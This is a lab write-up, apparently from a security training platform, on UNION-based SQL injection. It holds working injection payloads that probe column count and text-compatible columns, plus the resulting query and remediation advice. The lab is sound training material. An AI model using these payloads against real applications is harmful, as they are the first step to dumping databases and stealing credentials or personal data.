# Lab 08: SQL Injection - Finding a Column Containing Text

## 🎯 Objective
The goal of this lab was to determine which columns in the database query accept text data, and then use a UNION attack to make the database retrieve a specific random string provided by the lab.

## 🔍 Vulnerability Description
When performing a UNION-based SQL injection, the injected SELECT statement must match the column count of the original query. Furthermore, the data types must be compatible. By testing each column with a string value, an attacker can identify which columns are capable of displaying text data.

## 💥 Exploitation Steps
1. Intercepted the request and confirmed the query returns 3 columns using: ' UNION SELECT NULL,NULL,NULL--
2. Tested each column individually to find the text-compatible one:
   - ' UNION SELECT 'abc',NULL,NULL-- (Error)
   - ' UNION SELECT NULL,'abc',NULL-- (Success, 'abc' displayed)
   - ' UNION SELECT NULL,NULL,'abc'-- (Success, 'abc' displayed)
3. Identified that columns 2 and 3 accept text data.
4. Injected the specific string required by the lab (e.g., p4ltUT) into the second column.

Payload used: ' UNION SELECT NULL,'p4ltUT',NULL--

Resulting Query: SELECT * FROM products WHERE category = '' UNION SELECT NULL,'p4ltUT',NULL--' AND released = 1

## ⚠️ Impact
Finding the text-compatible column is the foundational step for extracting sensitive information (like usernames, passwords, or PII) from other tables in the database. An attacker can use this exact technique to dump the entire database.

## 🛡️ Remediation (Blue Team Perspective)
Use Parameterized Queries (Prepared Statements) to prevent user input from being interpreted as SQL code. Additionally, restrict database permissions so the application user can only access necessary tables, and avoid displaying raw database errors to the user.
